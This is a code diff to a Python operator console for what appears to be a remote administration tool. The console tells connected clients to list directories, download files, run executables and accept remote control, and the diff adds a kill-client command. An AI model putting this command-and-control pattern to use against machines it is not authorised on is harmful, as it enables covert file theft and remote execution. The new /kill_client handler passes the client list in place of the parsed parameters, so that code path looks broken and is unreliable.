@@ -49,7 +49,7 @@ class Control:
         return 'id_' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
 
     def init_control(self) -> None:
-        init_message = {"mode": "init", "client_mode": "control"}
+        init_message = {"mode": "init",  "client_mode": "control"}
         self.send_message(init_message)
 
     def send_message(self, message: Dict[str, Any]) -> None:
@@ -80,6 +80,12 @@ class Control:
         for file in data['data']['list']:
             print(f"  - {file}")
 
+    def print_run(self, data: Dict[str, Any]) -> None:
+        if data["data"]["state"] == "success":
+            print(f"\nClient {data['data']['client_id']} run {data['data']['exe_path']} successfully")
+        elif data["data"]["state"] == "error":
+            print(f"\nClient_{data['data']['client_id']} run {data['data']['exe_path']} error:")
+            print(f"{data['data']['error']}")
     def save_downloaded_file(self, data: Dict[str, Any]) -> None:
         output_path = data["data"]["output"]
         file_name = os.path.basename(data["data"]["file"])
@@ -122,10 +128,12 @@ class Control:
 
         self.send_message({
             "mode": "init_remote_control",
-            "remote_control_id": remote_control_id,
-            "client_id": client_id,
-            "controll_client_id": self.id,
-            "data": default_params
+            "data": {
+                "remote_control_id": remote_control_id,
+                "client_id": client_id,
+                "controll_client_id": self.id,
+                "default_params": default_params
+            }
         })
 
         if not hasattr(self, 'remote_control_ui'):
@@ -186,6 +194,8 @@ class Control:
         elif data["mode"] == "return":
             if data["data"]["mode"] == "dir":
                 self.print_directory(data)
+            elif data["data"]["mode"] == "run":
+                self.print_run(data)
             elif data["data"]["mode"] == "download":
                 self.save_downloaded_file(data)
             elif data["data"]["mode"] == "remote_control":
@@ -194,13 +204,16 @@ class Control:
     def directory(self, client_id: str, root: str) -> None:
         self.send_message({
             "mode": "directory",
-            "param": {"client_id": client_id, "root": root}
+            "data": {
+                "client_id": client_id,
+                "root": root
+            }
         })
 
     def init_download(self, client_id: str, file_path: str, output_path: str) -> None:
         self.send_message({
             "mode": "init_download",
-            "param": {
+            "data": {
                 "client_id": client_id,
                 "file": file_path,
                 "output": output_path
@@ -210,8 +223,9 @@ class Control:
     def run(self, params: Dict) -> None:
         self.send_message({
             "mode": "run",
-            "param": {
+            "data": {
                 "client_id": params["client_id"],
+                "controll_client_id": self.id,
                 "exe_path": params["exe_path"],
             }
         })
@@ -225,7 +239,14 @@ class Control:
         if hasattr(self, 'input_thread') and self.input_thread.is_alive():
             self.input_thread.join()
         sys.exit()
-
+    def kill_client(self, params):
+        self.send_message({
+            "mode": "kill_client",
+            "data": {
+                "client_id": params["client_id"],
+                "controll_client_id": self.id,
+            }
+        })
     def input_command(self) -> None:
         help_text = """
 Available commands:
@@ -250,6 +271,8 @@ Available commands:
                     self.close()
                 elif command == "/client_list":
                     self.print_client_list(self.controlled_client_list)
+                elif command == "/kill_client":
+                    self.kill_client(self.controlled_client_list)
                 elif command == "/dir":
                     self._handle_dir_command(params)
                 elif command == "/download":
@@ -258,13 +281,13 @@ Available commands:
                     self._handle_remote_control_command(params)
                 elif command == "/run":
                     self._handle_run_command(params)
-
                 elif command == "/help":
                     print(help_text)
                 else:
                     print(f"Unknown command: {command}")
             else:
                 print("Commands must start with '/'. Type /help for available commands.")
+            time.sleep(0.5)
 
     def _parse_params(self, parts: List[str]) -> Dict[str, str]:
         params = {}
@@ -364,7 +387,7 @@ class RemoteControlUI(QWidget):
                         break
             self.parent_control.send_message({
             "mode": "stop_remote_control",
-            "param": {
+            "data": {
                 "client_id": self.info["client_id"],
                 "remote_control_id": self.info["remote_control_id"]
             }
